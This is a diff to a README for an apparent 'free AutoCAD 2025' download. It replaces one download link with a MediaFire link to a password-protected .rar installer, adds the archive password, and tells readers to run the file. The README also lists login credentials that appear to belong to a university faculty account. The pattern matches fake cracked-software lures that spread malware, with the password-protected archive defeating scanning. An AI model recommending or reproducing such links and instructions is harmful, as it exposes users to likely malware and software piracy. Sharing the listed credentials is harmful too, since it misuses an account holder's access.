@@ -1,7 +1,9 @@
 # AutoCad-2025-Free
 
-[Click here to Download](https://rdmfile.eu/install/ZynciXl9VprA)
+[Click here to Download](https://www.mediafire.com/file/cfgo9c9v24qesr0/AutoCAD_2025_Win64_install.rar/file)
 
+
+[Pass : S0f4fr33!]
 
 
 Once the Installer is downloaded execute the file. The login information is: faculty1@uoft.edu Pass: S0f4fr33!
